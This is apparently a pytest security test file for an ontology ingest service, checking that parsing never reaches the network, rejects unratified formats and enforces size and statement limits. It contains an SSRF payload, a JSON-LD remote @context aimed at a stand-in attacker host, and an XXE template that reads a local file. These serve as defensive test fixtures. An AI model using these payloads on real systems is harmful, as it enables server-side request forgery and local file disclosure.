"""Ontology parsing must stay offline and bounded (AUDIT-031 / R07, T003 RED).

Two defects sit next to each other in ``ontology/index.py``:

* ``_rdflib_format`` maps the four ratified names and then falls back to ``fmt.lower()``, so any
  format rdflib happens to support passes straight through — JSON-LD included, which SPEC-24 never
  ratified;
* ``graph.parse(data=content, format=...)`` runs that parser on attacker-supplied text with no
  network policy and no resource ceiling.

Those combine into the actual vulnerability: rdflib's JSON-LD parser **dereferences a remote
``@context``**, so a document is enough to make the server fetch a URL the attacker chose — an SSRF
from inside the ingest path, reachable by anyone who can upload an ontology. The same absence of
bounds means a 5 GB document or a million statements is simply attempted.

Ratified budgets (AUDIT-031 clarifications): 5 MiB, 100,000 statements, hierarchy depth 32, ten
seconds of processing, 256 MiB in an isolated parser. Deployments may lower them.

The canary is deliberately at the socket layer rather than at rdflib's: it records DNS and connect
attempts whatever library makes them, so the test proves "nothing reached the network" instead of
"this one parser was configured".

Not covered here: the ten-second and 256 MiB ceilings, which need the isolated-parser contract T004
introduces — a wall-clock assertion against today's in-process parser would be timing-flaky and would
not prove isolation.
"""

from __future__ import annotations

import socket
import uuid
from collections.abc import Callable, Iterator
from pathlib import Path

import httpx
import pytest

from rsc_brain.api.app import ApiDeps, create_app
from rsc_brain.identity.service import IdentityService
from rsc_brain.ontology.index import OntologyIndex, OntologyParseError
from rsc_brain.stores.relational.store import PgRelationalStore

from .conftest import Harness, unique_slug

pytestmark = pytest.mark.integration

ATTACKER_HOST = "ontology-canary.attacker.example"

#: A JSON-LD document whose context is remote. Parsing it is what fetches the URL.
JSONLD_REMOTE_CONTEXT = (
    '{"@context": "https://' + ATTACKER_HOST + '/ctx.jsonld", '
    '"@id": "https://example.org/Thing", "name": "Thing"}'
)

#: RDF/XML with an external entity — the classic XXE shape, aimed at a local file.
XXE_TEMPLATE = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE rdf:RDF [<!ENTITY leak SYSTEM "file://{path}">]>\n'
    '<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"\n'
    '         xmlns:rdfs="http://www.w3.org/2000/01/rdf-schema#">\n'
    '  <rdf:Description rdf:about="https://example.org/A">\n'
    "    <rdfs:label>&leak;</rdfs:label>\n"
    "  </rdf:Description>\n"
    "</rdf:RDF>\n"
)

#: Unratified formats paired with content that is VALID for them. Malformed content would be
#: refused by the parser and prove nothing about the allowlist — every one of these is accepted today.
UNRATIFIED_FORMATS: tuple[tuple[str, str], ...] = (
    (
        "json-ld",
        '{"@context": {"name": "http://schema.org/name"}, '
        '"@id": "http://example.org/A", "name": "A"}',
    ),
    ("n3", "@prefix ex: <http://example.org/> . ex:a ex:b ex:c ."),
    (
        "nquads",
        "<http://example.org/s> <http://example.org/p> <http://example.org/o> "
        "<http://example.org/g> .",
    ),
    ("trig", "@prefix ex: <http://example.org/> . { ex:a ex:b ex:c . }"),
)

#: The four names SPEC-24 ratified. A refusal has to name the format as unsupported, so it cannot be
#: confused with a syntax error — which is how three of these appeared "contained" while being wide
#: open to any valid document.
UNSUPPORTED_MARKERS = ("unsupported", "not supported", "not a supported", "allowed formats")


class NetworkAttempt(Exception):
    """Raised by the canary so the attempt is both recorded and stopped."""


@pytest.fixture
def network_canary(monkeypatch: pytest.MonkeyPatch) -> Iterator[list[str]]:
    """Record every DNS resolution and TCP connect attempted while parsing.

    At the socket layer on purpose: a canary that only patches one library proves that library was
    configured, not that the operation is offline.
    """
    attempts: list[str] = []

    def _getaddrinfo(host: object, port: object, *args: object, **kwargs: object) -> object:
        attempts.append(f"dns:{host}:{port}")
        raise NetworkAttempt(f"blocked DNS for {host}")

    def _connect(self: object, address: object) -> None:
        attempts.append(f"connect:{address}")
        raise NetworkAttempt(f"blocked connect to {address}")

    def _create_connection(address: object, *args: object, **kwargs: object) -> object:
        attempts.append(f"create_connection:{address}")
        raise NetworkAttempt(f"blocked connection to {address}")

    monkeypatch.setattr(socket, "getaddrinfo", _getaddrinfo)
    monkeypatch.setattr(socket.socket, "connect", _connect)
    monkeypatch.setattr(socket, "create_connection", _create_connection)
    yield attempts  # monkeypatch restores all three when the test ends


def _client(harness: Harness, tmp_path: Path) -> httpx.AsyncClient:
    app = create_app(
        deps=ApiDeps(sessionmaker=harness.sm, gateway=harness.gateway, data_dir=str(tmp_path))
    )
    return httpx.AsyncClient(transport=httpx.ASGITransport(app=app), base_url="http://test")


async def _admin_pat(harness: Harness, project_id: str) -> str:
    user = (
        await PgRelationalStore(harness.sm)
        .users()
        .create_user(email=f"{unique_slug('u')}@example.com", status="active", role="member")
    )
    identity = IdentityService(harness.sm)
    membership = await identity.add_membership(
        user.user_id, project_id, role="project-admin", allowed_topics=("general",)
    )
    return (await identity.issue_pat(membership)).token


@pytest.mark.filterwarnings("ignore::DeprecationWarning")
def test_parsing_never_reaches_the_network(network_canary: list[str]) -> None:
    """The SSRF itself: a remote ``@context`` must not be dereferenced.

    Demonstrated rather than theorised: with the canary in place this parse reaches
    ``create_connection(('ontology-canary.attacker.example', 443))`` — the server contacts a host the
    uploader chose, by upload alone.

    The ``filterwarnings`` override is load-bearing, not cosmetic. The suite turns warnings into
    errors, and rdflib's JSON-LD path emits a DeprecationWarning (ConjunctiveGraph) BEFORE it
    dereferences the context — so under the default policy the parser dies of its own warning and the
    egress never happens. That made this test pass while production was wide open. Restoring
    production warning behaviour is the only way the test observes what production does.
    """
    with pytest.raises(Exception):  # noqa: B017 - any refusal is acceptable; reaching out is not
        OntologyIndex.parse(JSONLD_REMOTE_CONTEXT, "json-ld")
    assert not network_canary, (
        "parsing an attacker-supplied ontology reached the network — an SSRF from inside the ingest "
        f"path, triggered by upload alone: {network_canary}"
    )


def test_a_local_file_reference_is_neither_read_nor_reflected(
    network_canary: list[str], tmp_path: Path
) -> None:
    """A file the server can read must not become ontology content."""
    secret = tmp_path / "canary.txt"
    marker = "local-file-canary-2f7b91"
    secret.write_text(marker, encoding="utf-8")

    document = XXE_TEMPLATE.format(path=secret)
    surfaced = ""
    try:
        index = OntologyIndex.parse(document, "owl")
        surfaced = str(index.__dict__)
    except OntologyParseError as exc:
        surfaced = str(exc)
    except Exception as exc:
        surfaced = str(exc)

    assert marker not in surfaced, (
        "a local file's content was read through an external entity and reflected back: "
        f"{surfaced[:200]!r}"
    )


@pytest.mark.filterwarnings("ignore::DeprecationWarning")
@pytest.mark.parametrize("fmt,content", UNRATIFIED_FORMATS, ids=[f for f, _ in UNRATIFIED_FORMATS])
def test_an_unratified_format_is_rejected_before_processing(fmt: str, content: str) -> None:
    """SPEC-24 ratified owl, rdf, skos and turtle. Anything else must be refused because it is not on
    the list — not accepted because rdflib happens to implement it.

    The content is valid for its format, so a permissive implementation accepts it — all four ARE
    accepted today (json-ld and n3 produce a triple each). The refusal must also SAY the format is
    unsupported: an implementation that happens to fail on syntax offers no containment for the next
    valid document.

    Production warning behaviour is restored for the same reason as the egress canary: under the
    suite's warnings-as-errors policy rdflib raises its own DeprecationWarning first, which would make
    these look contained while production accepts every one of them.
    """
    with pytest.raises(OntologyParseError) as raised:
        OntologyIndex.parse(content, fmt)
    message = str(raised.value).lower()
    assert any(marker in message for marker in UNSUPPORTED_MARKERS), (
        f"{fmt} was refused, but not as an unsupported format: {message[:160]!r} — a syntax-shaped "
        "refusal means the next valid document of this format gets through"
    )


def test_a_document_over_the_size_budget_is_rejected() -> None:
    """5 MiB is the ratified ceiling; above it the work must not be attempted.

    The document is VALID turtle: padding it with junk would be refused as malformed and would say
    nothing about the byte budget.
    """
    filler = "x" * 4096
    triples = "".join(
        f'<http://example.org/s{i}> <http://example.org/p> "{filler}" .\n' for i in range(1500)
    )
    assert len(triples.encode()) > 5 * 1024 * 1024, "the fixture is not actually over the budget"
    with pytest.raises(OntologyParseError) as raised:
        OntologyIndex.parse(triples, "turtle")
    assert "size" in str(raised.value).lower() or "large" in str(raised.value).lower(), (
        f"refused, but not for its size: {str(raised.value)[:160]!r}"
    )


def test_a_document_over_the_statement_budget_is_rejected() -> None:
    """100,000 statements is the ratified ceiling. Small bytes can still be an enormous graph, so the
    byte ceiling alone does not bound the work."""
    lines = "@prefix e: <http://e.org/> .\n" + "".join(
        f"e:s{i} e:p e:o{i} .\n" for i in range(120_000)
    )
    assert len(lines.encode()) < 5 * 1024 * 1024, (
        "the fixture must stay UNDER the byte ceiling, or it would prove the size bound instead"
    )
    with pytest.raises(OntologyParseError) as raised:
        OntologyIndex.parse(lines, "turtle")
    assert "statement" in str(raised.value).lower() or "too many" in str(raised.value).lower(), (
        f"refused, but not for its statement count: {str(raised.value)[:160]!r}"
    )


async def test_a_parse_error_does_not_echo_the_submitted_content(
    build_harness: Callable[..., Harness], tmp_path: Path
) -> None:
    """The API returns ``invalid ontology: {exc}``, and rdflib's message quotes the offending input.

    A stable error class and attribution are required; the content, a local path, an internal URL, a
    credential or a stack trace are not (AUDIT-031 acceptance).
    """
    harness = build_harness()
    project = await harness.setup_project(unique_slug("acme"), [("general", 0)])
    token = await _admin_pat(harness, project)
    marker = f"secret-payload-{uuid.uuid4().hex[:8]}"

    async with _client(harness, tmp_path) as client:
        response = await client.post(
            "/api/v1/admin/ontologies",
            json={
                "name": unique_slug("onto"),
                "format": "turtle",
                "content": f"@prefix ex: <https://example.org/> .\nex:a ex:b {marker} ;;; broken",
            },
            headers={"Authorization": f"Bearer {token}"},
        )

    assert response.status_code == 422, response.text
    assert marker not in response.text, (
        f"the parse error echoed the submitted content back to the caller: {response.text[:300]!r}"
    )
